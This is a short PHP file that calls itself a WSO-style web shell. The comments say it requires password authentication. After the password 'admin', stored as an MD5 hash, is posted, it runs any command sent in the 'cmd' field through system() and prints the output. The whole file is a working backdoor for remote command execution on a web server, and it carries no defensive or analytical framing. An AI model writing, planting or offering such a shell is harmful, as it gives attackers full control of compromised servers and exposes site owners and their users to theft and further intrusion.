<?php
// WSO (Web Shell by Orb) style shell
// Requires password authentication

$auth_pass = "21232f297a57a5a743894a0e4a801fc3"; // md5("admin")

if(isset($_POST['pass']) && md5($_POST['pass']) == $auth_pass) {
    if(isset($_POST['cmd'])) {
        echo "<pre>";
        system($_POST['cmd']);
        echo "</pre>";
    }
}
?>
